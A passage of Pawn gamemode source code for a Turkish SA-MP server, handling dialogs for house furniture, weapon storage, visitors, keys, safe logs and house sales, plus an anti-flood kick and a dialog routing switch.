	        if(id == INVALID_HOUSE_ID) return SendClientMessage(playerid, 0xE74C3CFF, "Herhangi bir evde deðilsin.");
			if(strcmp(HouseData[id][Owner], GetName(playerid))) return SendClientMessage(playerid, 0xE74C3CFF, "Bu evin sahibi deðilsin.");
	  		new query[96], Cache: weapon;
	    	mysql_format(Connection, query, sizeof(query), "SELECT WeaponID, Ammo FROM houseguns WHERE HouseID=%d ORDER BY WeaponID ASC LIMIT %d, 1", id, listitem);
			weapon = mysql_query(Connection, query);
			new rows = cache_num_rows();
			if(rows) {
	  			new string[64], weapname[32], weaponid;
	  			cache_get_value_name_int(0, "WeaponID", weaponid);
	  			GetWeaponName(weaponid, weapname, sizeof(weapname));
	  			new ewpammo;
	  			cache_get_value_name_int(0, "Ammo", ewpammo);
	  			GivePlayerWeapon(playerid, weaponid, ewpammo);
				format(string, sizeof(string), "Evine %s isimli silahý koydun.", weapname);
				SendClientMessage(playerid, 0xFFFFFFFF, string);
				mysql_format(Connection, query, sizeof(query), "DELETE FROM houseguns WHERE HouseID=%d AND WeaponID=%d", id, weaponid);
				mysql_tquery(Connection, query, "", "");
			}else{
				SendClientMessage(playerid, 0xE74C3CFF, "Girdiðin silaha sahip deðilsin.");
			}

			cache_delete(weapon);
			return 1;
		}

	    if(dialogid == DIALOG_FURNITURE_MENU)
		{
		    if(!response) return ShowHouseMenu(playerid);
	        new id = InHouse[playerid];
	        if(id == INVALID_HOUSE_ID) return SendClientMessage(playerid, 0xE74C3CFF, "Herhangi bir evde deðilsin.");
			if(strcmp(HouseData[id][Owner], GetName(playerid))) return SendClientMessage(playerid, 0xE74C3CFF, "Bu evin sahibi deðilsin.");
			if(HouseData[id][SalePrice] > 0) return SendClientMessage(playerid, 0xE74C3CFF, "Ev satýþtayken bu özelliði kullanamazsýn.");

			if(listitem == 0)
			{
			    new list[512];
			    format(list, sizeof(list), "#\tMobilya Adý\tFiyatý\n");
			    for(new i; i < sizeof(HouseFurnitures); ++i)
			    {
			        format(list, sizeof(list), "%s%d\t%s\t$%s\n", list, i+1, HouseFurnitures[i][HOName], convertNumber(HouseFurnitures[i][Price]));
			    }

			    ShowPlayerDialog(playerid, DIALOG_FURNITURE_BUY, DIALOG_STYLE_TABLIST_HEADERS, "Mobilya Satýnal", list, "Satýnal", "Geri");
			}

			if(listitem == 1)
			{
				SelectMode[playerid] = SELECT_MODE_EDIT;
			    SelectObject(playerid);
			    SendClientMessage(playerid, 0xFFFFFFFF, "Düzenlemek istediðin mobilyaya týklayýnýz.");
			}

			if(listitem == 2)
			{
			    SelectMode[playerid] = SELECT_MODE_SELL;
			    SelectObject(playerid);
			    SendClientMessage(playerid, 0xFFFFFFFF, "Satmak istediðiniz mobilyaya týklayýnýz.");
			}

			if(listitem == 3)
			{
			    new money, sold, data[e_furniture], query[64];
			    for(new i; i < Streamer_GetUpperBound(STREAMER_TYPE_OBJECT); ++i)
			    {
			        if(!IsValidDynamicObject(i)) continue;
					Streamer_GetArrayData(STREAMER_TYPE_OBJECT, i, E_STREAMER_EXTRA_ID, data);
					if(ObjeSistemde[i] == true && data[HouseIDsa] == id)
					{
					    sold++;
					    money += HouseFurnitures[ data[ArrayID] ][Price];
						DestroyDynamicObject(i);
					}
			    }

			    new string[64];
			    format(string, sizeof(string), "%d Ýsimli mobilyayý sattýn ücret: $%s.", sold, convertNumber(money));
			    SendClientMessage(playerid, -1, string);
			    //GivePlayerMoney(playerid, money);
			    RewardPlayer(playerid, money, 0);

			    mysql_format(Connection, query, sizeof(query), "DELETE FROM housefurnitures WHERE HouseID=%d", id);
			    mysql_tquery(Connection, query, "", "");
			}

		    return 1;
		}

		if(dialogid == DIALOG_FURNITURE_BUY)
		{
		    if(!response) return ShowHouseMenu(playerid);
	        new id = InHouse[playerid];
	        if(id == INVALID_HOUSE_ID) return SendClientMessage(playerid, 0xE74C3CFF, "Herhangi bir evde deðilsin.");
			if(strcmp(HouseData[id][Owner], GetName(playerid))) return SendClientMessage(playerid, 0xE74C3CFF, "Bu evin sahibi deðilsin.");
			if(HouseData[id][SalePrice] > 0) return SendClientMessage(playerid, 0xE74C3CFF, "Ev satýþtayken bu özelliði kullanamazsýn");
			if(HouseFurnitures[listitem][Price] > APlayerData[playerid][PlayerMoney]) return SendClientMessage(playerid, 0xE74C3CFF, "Bu mobilyayý almak için yeterli paraya sahip deðilsin.");
			//GivePlayerMoney(playerid, -HouseFurnitures[listitem][Price]);
			RewardPlayer(playerid, -HouseFurnitures[listitem][Price], 0);
			new Float: x, Float: y, Float: z;
			GetPlayerPos(playerid, x, y, z);
	        GetXYInFrontOfPlayer(playerid, x, y, 3.0);
	        new objectid = CreateDynamicObject(HouseFurnitures[listitem][ModelID], x, y, z, 0.0, 0.0, 0.0, GetPlayerVirtualWorld(playerid), GetPlayerInterior(playerid)), query[256];
			mysql_format(Connection, query, sizeof(query), "INSERT INTO housefurnitures SET HouseID=%d, FurnitureID=%d, FurnitureX=%f, FurnitureY=%f, FurnitureZ=%f, FurnitureVW=%d, FurnitureInt=%d", id, listitem, x, y, z, GetPlayerVirtualWorld(playerid), GetPlayerInterior(playerid));
	        new Cache: add = mysql_query(Connection, query), data[e_furniture];
	        data[SQLID] = cache_insert_id();
			data[HouseIDsa] = id;
	        data[ArrayID] = listitem;
			data[furnitureX] = x;
			data[furnitureY] = y;
			data[furnitureZ] = z;
			data[furnitureRX] = 0.0;
			data[furnitureRY] = 0.0;
			data[furnitureRZ] = 0.0;
			cache_delete(add);
			Streamer_SetArrayData(STREAMER_TYPE_OBJECT, objectid, E_STREAMER_EXTRA_ID, data);
            ObjeSistemde[objectid] = true;
			EditingFurniture[playerid] = true;
			EditDynamicObject(playerid, objectid);
			return 1;
		}

		if(dialogid == DIALOG_FURNITURE_SELL)
		{
		    if(!response) return 1;
	        new id = InHouse[playerid];
	        if(id == INVALID_HOUSE_ID) return SendClientMessage(playerid, 0xE74C3CFF, "Herhangi bir evde deðilsin.");
			if(strcmp(HouseData[id][Owner], GetName(playerid))) return SendClientMessage(playerid, 0xE74C3CFF, "Bu evin sahibi deðilsin.");
			if(HouseData[id][SalePrice] > 0) return SendClientMessage(playerid, 0xE74C3CFF, "Ev satýþtayken bu özelliði kullanamazsýn");
			new objectid = GetPVarInt(playerid, "SelectedFurniture"), query[64], data[e_furniture];
			if(ObjeSistemde[objectid] == false) return SendClientMessage(playerid, 0xE74C3CFF, "Bu ev sistemine baðlý bir obje deðil.");
			Streamer_GetArrayData(STREAMER_TYPE_OBJECT, objectid, E_STREAMER_EXTRA_ID, data);
			//GivePlayerMoney(playerid, HouseFurnitures[ data[ArrayID] ][Price]);
			RewardPlayer(playerid, HouseFurnitures[ data[ArrayID] ][Price], 0);
			ObjeSistemde[objectid] = false;
			mysql_format(Connection, query, sizeof(query), "DELETE FROM housefurnitures WHERE ID=%d", data[SQLID]);
			mysql_tquery(Connection, query, "", "");
			DestroyDynamicObject(objectid);
			DeletePVar(playerid, "SelectedFurniture");
			return 1;
		}

		if(dialogid == DIALOG_VISITORS_MENU)
		{
			if(!response) return ShowHouseMenu(playerid);
			new id = InHouse[playerid];
	        if(id == INVALID_HOUSE_ID) return SendClientMessage(playerid, 0xE74C3CFF, "Herhangi bir evde deðilsin.");
			if(strcmp(HouseData[id][Owner], GetName(playerid))) return SendClientMessage(playerid, 0xE74C3CFF, "Bu evin sahibi deðilsin.");
			if(listitem == 0)
			{
			    new query[200], Cache: visitors;
			    mysql_format(Connection, query, sizeof(query), "SELECT Visitor, FROM_UNIXTIME(Date, '%%d/%%m/%%Y %%H:%%i') as VisitDate FROM housevisitors WHERE HouseID=%d ORDER BY Date DESC LIMIT 0, 15", id);
				visitors = mysql_query(Connection, query);
				new rows = cache_num_rows();
				if(rows) {
				    new list[1024], visitor_name[MAX_PLAYER_NAME], visit_date[20];
				    format(list, sizeof(list), "Ziyaretçi\tTarihi\n");
				    for(new i; i < rows; ++i)
				    {
				        cache_get_value_name(i, "Visitor", visitor_name);
				        cache_get_value_name(i, "VisitDate", visit_date);
				        format(list, sizeof(list), "%s%s\t%s\n", list, visitor_name, visit_date);
				    }

				    ShowPlayerDialog(playerid, DIALOG_VISITORS, DIALOG_STYLE_TABLIST_HEADERS, "Ev Ziyaretçileri (Page 1)", list, "Sonraki", "Önceki");
				}else{
					SendClientMessage(playerid, 0xE74C3CFF, "Evin hiç ziyaretçisi yok.");
				}

			    cache_delete(visitors);
			}

			if(listitem == 1)
			{
			    new query[64];
			    mysql_format(Connection, query, sizeof(query), "DELETE FROM housevisitors WHERE HouseID=%d", id);
	    		mysql_tquery(Connection, query, "", "");
	    		ShowHouseMenu(playerid);
			}

			return 1;
		}

		if(dialogid == DIALOG_VISITORS)
		{
			if(!response) {
				ListPage[playerid]--;
				if(ListPage[playerid] < 0)
				{
				    ListPage[playerid] = 0;
				    ShowHouseMenu(playerid);
				    return 1;
				}
			}else{
			    ListPage[playerid]++;
			}

			new id = InHouse[playerid];
	        if(id == INVALID_HOUSE_ID) return SendClientMessage(playerid, 0xE74C3CFF, "Herhangi bir evde deðilsin.");
			if(strcmp(HouseData[id][Owner], GetName(playerid))) return SendClientMessage(playerid, 0xE74C3CFF, "Bu evin sahibi deðilsin.");
	  		new query[200], Cache: visitors;
	    	mysql_format(Connection, query, sizeof(query), "SELECT Visitor, FROM_UNIXTIME(Date, '%%d/%%m/%%Y %%H:%%i') as VisitDate FROM housevisitors WHERE HouseID=%d ORDER BY Date DESC LIMIT %d, 15", id, ListPage[playerid]*15);
			visitors = mysql_query(Connection, query);
			new rows = cache_num_rows();
			if(rows) {
	  			new list[1024], visitor_name[MAX_PLAYER_NAME], visit_date[20];
		    	format(list, sizeof(list), "Ziyaretçi\tTarihi\n");
			    for(new i; i < rows; ++i)
			    {
	      			cache_get_value_name(i, "Visitor", visitor_name);
		        	cache_get_value_name(i, "VisitDate", visit_date);
			        format(list, sizeof(list), "%s%s\t%s\n", list, visitor_name, visit_date);
			    }

				new title[32];
				format(title, sizeof(title), "Ev Ziyaretçileri (Page %d)", ListPage[playerid]+1);
				ShowPlayerDialog(playerid, DIALOG_VISITORS, DIALOG_STYLE_TABLIST_HEADERS, title, list, "Sonraki", "Önceki");
			}else{
				SendClientMessage(playerid, 0xE74C3CFF, "Evinini hiç ziyaretçisi yok.");
				ListPage[playerid] = 0;
	   			ShowHouseMenu(playerid);
			}

			cache_delete(visitors);
			return 1;
		}

		if(dialogid == DIALOG_KEYS_MENU)
		{
			if(!response) return ShowHouseMenu(playerid);
			new id = InHouse[playerid];
	        if(id == INVALID_HOUSE_ID) return SendClientMessage(playerid, 0xE74C3CFF, "Herhangi bir evde deðilsin.");
			if(strcmp(HouseData[id][Owner], GetName(playerid))) return SendClientMessage(playerid, 0xE74C3CFF, "Bu evin sahibi deðilsin.");
			if(listitem == 0)
			{
			    new query[200], Cache: keyowners;
			    mysql_format(Connection, query, sizeof(query), "SELECT Player, FROM_UNIXTIME(Date, '%%d/%%m/%%Y %%H:%%i') as KeyDate FROM housekeys WHERE HouseID=%d ORDER BY Date DESC LIMIT %d, 15", id, ListPage[playerid]*15);
				keyowners = mysql_query(Connection, query);
				new rows = cache_num_rows();
				if(rows) {
				    new list[1024], key_name[MAX_PLAYER_NAME], key_date[20];
				    format(list, sizeof(list), "Anahtar Sahibi\tVerildiði Tarih\n");
				    for(new i; i < rows; ++i)
				    {
				        cache_get_value_name(i, "Player", key_name);
				        cache_get_value_name(i, "KeyDate", key_date);
				        format(list, sizeof(list), "%s%s\t%s\n", list, key_name, key_date);
				    }

				    ShowPlayerDialog(playerid, DIALOG_KEYS, DIALOG_STYLE_TABLIST_HEADERS, "Anahtar Sahipleri (Page 1)", list, "Sonraki", "Önceki");
				}else{
					SendClientMessage(playerid, 0xE74C3CFF, "Hiç anahtar sahibi yok.");
				}

			    cache_delete(keyowners);
			}

			if(listitem == 1)
			{
			    foreach(new i : Player)
			    {
			        if(Iter_Contains(HouseKeys[i], id)) Iter_Remove(HouseKeys[i], id);
			    }

			    new query[64];
			    mysql_format(Connection, query, sizeof(query), "DELETE FROM housekeys WHERE HouseID=%d", id);
	    		mysql_tquery(Connection, query, "", "");
	    		ShowHouseMenu(playerid);
			}

			return 1;
		}

		if(dialogid == DIALOG_KEYS)
		{
		    if(!response) {
				ListPage[playerid]--;
				if(ListPage[playerid] < 0)
				{
				    ListPage[playerid] = 0;
				    ShowHouseMenu(playerid);
				    return 1;
				}
			}else{
			    ListPage[playerid]++;
			}

			new id = InHouse[playerid];
	        if(id == INVALID_HOUSE_ID) return SendClientMessage(playerid, 0xE74C3CFF, "Herhangi bir evde deðilsin.");
			if(strcmp(HouseData[id][Owner], GetName(playerid))) return SendClientMessage(playerid, 0xE74C3CFF, "Bu evin sahibi deðilsin.");
	        new query[200], Cache: keyowners;
	  		mysql_format(Connection, query, sizeof(query), "SELECT Player, FROM_UNIXTIME(Date, '%%d/%%m/%%Y %%H:%%i') as KeyDate FROM housekeys WHERE HouseID=%d ORDER BY Date DESC LIMIT %d, 15", id, ListPage[playerid]*15);
			keyowners = mysql_query(Connection, query);
			new rows = cache_num_rows();
			if(rows) {
	  			new list[1024], key_name[MAX_PLAYER_NAME], key_date[20];
		    	format(list, sizeof(list), "Anahtar Sahibi\tVerildiði Tarih\n");
			    for(new i; i < rows; ++i)
			    {
	      			cache_get_value_name(i, "Player", key_name);
		        	cache_get_value_name(i, "KeyDate", key_date);
			        format(list, sizeof(list), "%s%s\t%s\n", list, key_name, key_date);
			    }

	            new title[32];
				format(title, sizeof(title), "Anahtar Sahipleri (Page %d)", ListPage[playerid]+1);
				ShowPlayerDialog(playerid, DIALOG_KEYS, DIALOG_STYLE_TABLIST_HEADERS, title, list, "Sonraki", "Önceki");
			}else{
			    ListPage[playerid] = 0;
	   			ShowHouseMenu(playerid);
				SendClientMessage(playerid, 0xE74C3CFF, "Hiç anahtar sahibi yok.");
			}

			cache_delete(keyowners);
		    return 1;
		}

		if(dialogid == DIALOG_SAFE_HISTORY)
		{
		    if(!response) {
				ListPage[playerid]--;
				if(ListPage[playerid] < 0)
				{
				    ListPage[playerid] = 0;
				    ShowHouseMenu(playerid);
				    return 1;
				}
			}else{
			    ListPage[playerid]++;
			}

			new id = InHouse[playerid];
	        if(id == INVALID_HOUSE_ID) return SendClientMessage(playerid, 0xE74C3CFF, "Herhangi bir evde deðilsin.");
			if(strcmp(HouseData[id][Owner], GetName(playerid))) return SendClientMessage(playerid, 0xE74C3CFF, "Bu evin sahibi deðilsin.");
	        new query[200], Cache: safelog;
	  		mysql_format(Connection, query, sizeof(query), "SELECT Type, Amount, FROM_UNIXTIME(Date, '%%d/%%m/%%Y %%H:%%i') as TransactionDate FROM housesafelogs WHERE HouseID=%d ORDER BY Date DESC LIMIT %d, 15", id, ListPage[playerid]*15);
			safelog = mysql_query(Connection, query);
			new rows = cache_num_rows();
			if(rows) {
	  			new list[1024], date[20];
		    	format(list, sizeof(list), "Eylem\tTarih\n");
		    	new tstype, tsamount;
			    for(new i; i < rows; ++i)
			    {
			        cache_get_value_name_int(i, "Type", tstype);
                    cache_get_value_name_int(i, "Amount", tsamount);
		        	cache_get_value_name(i, "TransactionDate", date);
			        format(list, sizeof(list), "%s%s $%s\t{FFFFFF}%s\n", list, TransactionNames[ tstype ], convertNumber(tsamount), date);
			    }

	            new title[32];
				format(title, sizeof(title), "Kasa geçmiþi (Page %d)", ListPage[playerid]+1);
				ShowPlayerDialog(playerid, DIALOG_SAFE_HISTORY, DIALOG_STYLE_TABLIST_HEADERS, title, list, "Sonraki", "Önceki");
			}else{
				SendClientMessage(playerid, 0xE74C3CFF, "Herhangi bir kasa geçmiþiniz yok.");
			}

			cache_delete(safelog);
		    return 1;
		}

		if(dialogid == DIALOG_MY_KEYS)
		{
		    if(!response) {
				ListPage[playerid]--;
				if(ListPage[playerid] < 0)
				{
				    ListPage[playerid] = 0;
				    return 1;
				}
			}else{
			    ListPage[playerid]++;
			}

	        new query[200], Cache: mykeys;
		    mysql_format(Connection, query, sizeof(query), "SELECT HouseID, FROM_UNIXTIME(Date, '%%d/%%m/%%Y %%H:%%i') as KeyDate FROM housekeys WHERE Player='%e' ORDER BY Date DESC LIMIT %d, 15", GetName(playerid), ListPage[playerid]*15);
			mykeys = mysql_query(Connection, query);

			new rows = cache_num_rows();
			if(rows) {
	  			new list[1024], id, key_date[20];
		   		format(list, sizeof(list), "Ev ID\tVerildiði Tarih\n");
			    for(new i; i < rows; ++i)
			    {
			        cache_get_value_name_int(i, "HouseID", id);
		       		cache_get_value_name(i, "KeyDate", key_date);
			        format(list, sizeof(list), "%s%s's %s\t%s\n", list, HouseData[id][Owner], HouseData[id][HOName], key_date);
			    }

	            new title[32];
				format(title, sizeof(title), "Anahtarlarýn (Page %d)", ListPage[playerid]+1);
				ShowPlayerDialog(playerid, DIALOG_MY_KEYS, DIALOG_STYLE_TABLIST_HEADERS, title, list, "Ýleri", "Önceki");
			}else{
			    ListPage[playerid] = 0;
				SendClientMessage(playerid, 0xE74C3CFF, "Herhangi bir anahtara sahip deðilsin.");
			}

			cache_delete(mykeys);
		    return 1;
		}

		if(dialogid == DIALOG_BUY_HOUSE_FROM_OWNER)
		{
			if(!response) return 1;
			new id = GetPVarInt(playerid, "PickupHouseID");
			if(!IsPlayerInRangeOfPoint(playerid, 2.0, HouseData[id][houseX], HouseData[id][houseY], HouseData[id][houseZ])) return SendClientMessage(playerid, 0xE74C3CFF, "Herhangi bir evin yakýnýnda deðilsin.");
	        #if LIMIT_PER_PLAYER > 0
			if(OwnedHouses(playerid) + 1 > LIMIT_PER_PLAYER) return SendClientMessage(playerid, 0xE74C3CFF, "Daha fazla ev alamazsýnýz.");
			#endif
			if(HouseData[id][SalePrice] > APlayerData[playerid][PlayerMoney]) return SendClientMessage(playerid, 0xE74C3CFF, "Bu evi alacak kadar paraya sahip deðilsiniz.");
			if(HouseData[id][SalePrice] < 1) return SendClientMessage(playerid, 0xE74C3CFF, "Bu evin zaten bir sahibi var.");
	  		new old_owner[MAX_PLAYER_NAME], price = HouseData[id][SalePrice], owner_id = INVALID_PLAYER_ID;
	  		format(old_owner, MAX_PLAYER_NAME, "%s", HouseData[id][Owner]);

			foreach(new i : Player)
			{
				if(!strcmp(HouseData[id][Owner], GetName(i)))
				{
					owner_id = i;
					break;
				}
			}

			//GivePlayerMoney(playerid, -HouseData[id][SalePrice]);
			RewardPlayer(playerid, -HouseData[id][SalePrice], 0);
			GetPlayerName(playerid, HouseData[id][Owner], MAX_PLAYER_NAME);
	  		HouseData[id][LastEntered] = gettime();
	  		HouseData[id][SalePrice] = 0;
			HouseData[id][Save] = true;
			SaveHouse(id);
            GivePlayerAchievement(playerid, EvimAch, 1);
            
			UpdateHouseLabel(id);
			Streamer_SetIntData(STREAMER_TYPE_PICKUP, HouseData[id][HousePickup], E_STREAMER_MODEL_ID, 19522);
			Streamer_SetIntData(STREAMER_TYPE_MAP_ICON, HouseData[id][HouseIcon], E_STREAMER_TYPE, 32);
			SendToHouse(playerid, id);

			foreach(new i : Player)
		    {
		        if(i == playerid) continue;
		        if(InHouse[i] == id)
		        {
		            SetPVarInt(i, "HousePickupCooldown", gettime() + HOUSE_COOLDOWN);
		        	SetPlayerVirtualWorld(i, 0);
			        SetPlayerInterior(i, 0);
			        SetPlayerPos(i, HouseData[id][houseX], HouseData[id][houseY], HouseData[id][houseZ]);
			        InHouse[i] = INVALID_HOUSE_ID;
		        }

		        if(Iter_Contains(HouseKeys[i], id)) Iter_Remove(HouseKeys[i], id);
		   	}

		    new query[128];
		    if(IsPlayerConnected(owner_id)) {
	//	        GivePlayerMoney(owner_id, price);
		        RewardPlayer(owner_id, price, 0);

				new string[128];
				format(string, sizeof(string), "%s(%d) Evini $%s'a satýn aldý.", HouseData[id][Owner], playerid, convertNumber(price));
				SendClientMessage(owner_id, -1, string);
		    }else{
		        mysql_format(Connection, query, sizeof(query), "INSERT INTO housesales SET OldOwner='%e', NewOwner='%e', Price=%d", old_owner, HouseData[id][Owner], price);
		    	mysql_tquery(Connection, query, "", "");
		    }

		    mysql_format(Connection, query, sizeof(query), "DELETE FROM housevisitors WHERE HouseID=%d", id);
		    mysql_tquery(Connection, query, "", "");

		    mysql_format(Connection, query, sizeof(query), "DELETE FROM housekeys WHERE HouseID=%d", id);
		    mysql_tquery(Connection, query, "", "");

		    mysql_format(Connection, query, sizeof(query), "DELETE FROM housesafelogs WHERE HouseID=%d", id);
		    mysql_tquery(Connection, query, "", "");
			return 1;
		}

		if(dialogid == DIALOG_SELL_HOUSE)
		{
		    if(!response) return ShowHouseMenu(playerid);
	        new id = InHouse[playerid];
	        new Msg[128];
	        if(id == INVALID_HOUSE_ID) return SendClientMessage(playerid, 0xE74C3CFF, "Herhangi bir evde deðilsin.");
			if(strcmp(HouseData[id][Owner], GetName(playerid))) return SendClientMessage(playerid, 0xE74C3CFF, "Bu evin sahibi deðilsin.");
			if(listitem == 0)
			{
			    new money = floatround(HouseData[id][Price] * 0.85) + HouseData[id][SafeMoney];
	//		    GivePlayerMoney(playerid, money);
			    RewardPlayer(playerid, money, 0);
	 			format(Msg, 128, "[DIREKT SATIS] NICK : %s  -- EV : %d -- FIYAT : $%d", GetName(playerid),id,money);
				EVLOG(Msg);
				ResetHouse(id);
			}

			if(listitem == 1)
			{
			    if(HouseData[id][SalePrice] > 0) {
				    HouseData[id][SalePrice] = 0;
				    HouseData[id][Save] = true;

				    UpdateHouseLabel(id);
					Streamer_SetIntData(STREAMER_TYPE_PICKUP, HouseData[id][HousePickup], E_STREAMER_MODEL_ID, 19522);
					Streamer_SetIntData(STREAMER_TYPE_MAP_ICON, HouseData[id][HouseIcon], E_STREAMER_TYPE, 32);
				    SendClientMessage(playerid, -1, "Eviniz artýk satýlýk deðil.");
				}else{
					if(HouseData[id][SafeMoney] > 0) return SendClientMessage(playerid, 0xE74C3CFF, "Kasada para varken evi satamazsýn.");
					ShowPlayerDialog(playerid, DIALOG_SELLING_PRICE, DIALOG_STYLE_INPUT, "Ev Sat", "Evini satmak istediðiniz miktarý giriniz", "Satýþa koy", "Vazgeç");
				}
			}

		    return 1;
		}

		if(dialogid == DIALOG_SELLING_PRICE)
		{
		    if(!response) return ShowHouseMenu(playerid);
	        new id = InHouse[playerid];
	        if(id == INVALID_HOUSE_ID) return SendClientMessage(playerid, 0xE74C3CFF, "Herhangi bir evde deðilsin.");
			if(strcmp(HouseData[id][Owner], GetName(playerid))) return SendClientMessage(playerid, 0xE74C3CFF, "Bu evin sahibi deðilsin.");
	        new amount = strval(inputtext);
			if(!(1 <= amount <= 10000000)) return ShowPlayerDialog(playerid, DIALOG_SELLING_PRICE, DIALOG_STYLE_INPUT, "Ev Sat", "{E74C3C}Geçersiz miktar!\n\n{FFFFFF}Evini satmak istediðiniz miktarý giriniz", "Satýþa Koy", "Vazgeç");
			HouseData[id][SalePrice] = amount;
			HouseData[id][Save] = true;

			UpdateHouseLabel(id);
			Streamer_SetIntData(STREAMER_TYPE_PICKUP, HouseData[id][HousePickup], E_STREAMER_MODEL_ID, 1273);
			Streamer_SetIntData(STREAMER_TYPE_MAP_ICON, HouseData[id][HouseIcon], E_STREAMER_TYPE, 31);

			new string[128];
			format(string, sizeof(string), "Evini $%s'a satýþa koydun.", convertNumber(amount));
			SendClientMessage(playerid, -1, string);
		    return 1;
		}

    // Dinamik Duyuru Sistemi
	DuyuruDialogs(playerid, dialogid, response, listitem, inputtext);

    // Araç Sahiplik Sistemi
	AracDialogs(playerid, dialogid, response, listitem, inputtext);

	// Karavan Sistemi
	KaravanDialogs(playerid, dialogid, response);

	//new Float:objX, Float:objY, Float:objZ, Float:objRX, Float:objRY, Float:objRZ;
	// Anti Flood Sistemi
	if(DialogDurdur[playerid] == 1)
	{
		DialogSayisi[playerid]++;
		if(DialogSayisi[playerid] == 10)
		{
		    new Yazi[250];
		    format(Yazi, 250, "{FF0000}%s {F8F8FF}sunucudan tekmelendi ( Dialog Flood )", GetName(playerid));
		    SendClientMessageToAll(-1, Yazi);

		    printf("[KICK] %s(%d) ( Dialog Flood )", GetName(playerid), playerid);
		    SafeKick(playerid);
		    return 1;
		}
	}else{
		DialogSayisi[playerid] = 1;
	}

	DialogDurdur[playerid] = 1;
	DialogAMK(playerid);

	//Etkinlik Sistemi


	/*
	new YeniDialogTick = GetTickCount();
	if(YeniDialogTick - SonDialogTick[playerid] < 2000)
	{
		DialogSayisi[playerid]++;
		if(DialogSayisi[playerid] == 10)
		{
		    new Yazi[250];
		    format(Yazi, 250, "{FF0000}%s {F8F8FF}sunucudan tekmelendi ( Dialog Flood )", GetName(playerid));
		    SendClientMessageToAll(-1, Yazi);

		    printf("[KICK] %s(%d) ( Dialog Flood )", GetName(playerid), playerid);
		    SafeKick(playerid);
		    return 1;
		}
	}else{
		DialogSayisi[playerid] = 1;
	}
	SonDialogTick[playerid] = YeniDialogTick;
	*/

	// Select the proper dialog to process
	switch (dialogid)
	{
		case DialogRegister: Dialog_Register(playerid, response, inputtext); // The "Register"-dialog
		case DialogLogin: Dialog_Login(playerid, response, inputtext); // The "Login"-dialog

		case DialogStatsOtherPlayer: Dialog_StatsOtherPlayer(playerid, response, listitem);
		case DialogStatsHouse: Dialog_StatsHouse(playerid, response, listitem);
		case DialogStatsGoHouse: Dialog_StatsGoHouse(playerid, response, listitem);
		case DialogStatsGoBusiness: Dialog_StatsGoBusiness(playerid, response, listitem);

		case DialogRescue: Dialog_Rescue(playerid, response, listitem); // The rescue-dialog

		case DialogBuyLicenses: Dialog_BuyLicenses(playerid, response, listitem); // The license-dialog (allows the player to buy trucker/busdriver licenses)

		case DialogRules: Dialog_Rules(playerid, response);

		case DialogTruckerJobMethod: Dialog_TruckerSelectJobMethod(playerid, response, listitem); // The work-dialog for truckers (shows the loads he can carry and lets the player choose the load)
		case DialogTruckerSelectLoad: Dialog_TruckerSelectLoad(playerid, response, listitem); // The load-selection dialog for truckers (shows the startlocations for the selected load and let the player choose his startlocation)
		case DialogTruckerStartLoc: Dialog_TruckerSelectStartLoc(playerid, response, listitem); // The start-location dialog for truckers (shows the endlocations for the selected load and let the player choose his endlocation)
		case DialogTruckerEndLoc: Dialog_TruckerSelectEndLoc(playerid, response, listitem); // The end-location dialog for truckers (processes the selected endlocation and starts the job)

		case DialogBike: Dialog_Bike(playerid, response, listitem); // The bike-dialog
		case DialogCar: Dialog_Car(playerid, response, listitem); // The car-dialog (which uses a split dialog structure)
		case DialogPlane: Dialog_Plane(playerid, response, listitem); // The plane-dialog (which uses a split dialog structure)
		case DialogTrailer: Dialog_Trailer(playerid, response, listitem); // The trailer-dialog (which uses a split dialog structure)
		case DialogBoat: Dialog_Boat(playerid, response, listitem); // The boat-dialog
		case DialogNeon: Dialog_Neon(playerid, response, listitem); // The neon-dialog

		case DialogRentCarClass: Dialog_RentProcessClass(playerid, response, listitem); // The player chose a vehicleclass from where he can rent a vehicle
		case DialogRentCar: Dialog_RentCar(playerid, response, listitem); // The player chose a vehicle from the list of vehicles from the vehicleclass he chose before

		case DialogPlayerCommands: Dialog_PlayerCommands(playerid, response, listitem); // Displays all commands in a split-dialog structure
		case DialogPrimaryCarColor: Dialog_PrimaryCarColor(playerid, response, listitem);
		case DialogSedundaryCarColor: Dialog_SedundaryCarColor(playerid, response, listitem);

		case DialogWeather: Dialog_Weather(playerid, response, listitem); // The weather dialog
		case DialogCarOption: Dialog_CarOption(playerid, response, listitem); // The caroption dialog

		case DialogSelectConvoy: Dialog_SelectConvoy(playerid, response, listitem);
        case DialogSelectConvoySifre: Dialog_SelectConvoySifre(playerid, response, inputtext);

		case DialogHouseMenu: Dialog_HouseMenu(playerid, response, listitem); // Process the main housemenu
		case DialogUpgradeHouse: Dialog_UpgradeHouse(playerid, response, listitem); // Process the house-upgrade menu
		case DialogGoHome: Dialog_GoHome(playerid, response, listitem); // Port to one of your houses
		case DialogHouseNameChange: Dialog_ChangeHouseName(playerid, response, inputtext); // Change the name of your house
		case DialogSellHouse: Dialog_SellHouse(playerid, response); // Sell the house
		case DialogBuyCarClass: Dialog_BuyCarClass(playerid, response, listitem); // The player chose a vehicleclass from where he can buy a vehicle
		case DialogBuyCar: Dialog_BuyCar(playerid, response, listitem); // The player chose a vehicle from the list of vehicles from the vehicleclass he chose before
		case DialogSellCar: Dialog_SellCar(playerid, response, listitem);
		case DialogBuyInsurance: Dialog_BuyInsurance(playerid, response);
		case DialogGetCarSelectHouse: Dialog_GetCarSelectHouse(playerid, response, listitem);
		case DialogGetCarSelectCar: Dialog_GetCarSelectCar(playerid, response, listitem);
		case DialogUnclampVehicles: Dialog_UnclampVehicles(playerid, response);

		case DialogCreateBusSelType: Dialog_CreateBusSelType(playerid, response, listitem);
		case DialogBusinessMenu: Dialog_BusinessMenu(playerid, response, listitem);
		case DialogGoBusiness: Dialog_GoBusiness(playerid, response, listitem);
		case DialogBusinessNameChange: Dialog_ChangeBusinessName(playerid, response, inputtext); // Change the name of your business
		case DialogSellBusiness: Dialog_SellBusiness(playerid, response); // Sell the business

		case DialogHelpItemChosen: Dialog_HelpItemChosen(playerid, response, listitem);
		case DialogHelpItem: Dialog_HelpItem(playerid, response);

		case DialogOldPassword: Dialog_OldPassword(playerid, response, inputtext);
		case DialogNewPassword: Dialog_NewPassword(playerid, response, inputtext);
		case DialogConfirmPassword: Dialog_ConfirmPassword(playerid, response);

		//pilot licenta
		case DialogPilotJobMethod: Dialog_PilotSelectJobMethod(playerid, response, listitem); //
		case DialogPilotSelectLoad: Dialog_PilotSelectLoad(playerid, response, listitem); //
		case DialogPilotStartLoc: Dialog_PilotSelectStartLoc(playerid, response, listitem); //
